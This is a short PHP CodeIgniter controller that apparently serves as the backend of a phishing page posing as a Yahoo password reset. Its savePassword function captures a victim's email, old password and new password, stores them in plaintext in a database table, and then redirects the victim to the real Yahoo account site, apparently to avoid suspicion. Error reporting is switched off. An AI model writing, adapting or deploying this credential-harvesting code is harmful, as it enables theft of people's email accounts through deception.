<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {
	public function __construct(){
        parent::__construct();
        error_reporting(0);
    }

	public function index()
	{
		$this->defaulttheme->DefDisplay('frontend/index');
	}

	public function savePassword(){
		$email = $this->input->post('email');
		$old_password = $this->input->post('old_password');
		$new_password = $this->input->post('password');
		$confirm_password = $this->input->post('confirmPassword');
		$save = $this->db->insert('reset_password',[
			'email' => $email ,
			'old_password' => $old_password ,
			'new_password' => $new_password ,
			'confirm_password' => $confirm_password ,
		]);
		if($save){
			return redirect('https://id.yahoo.com');
		}
	}
}
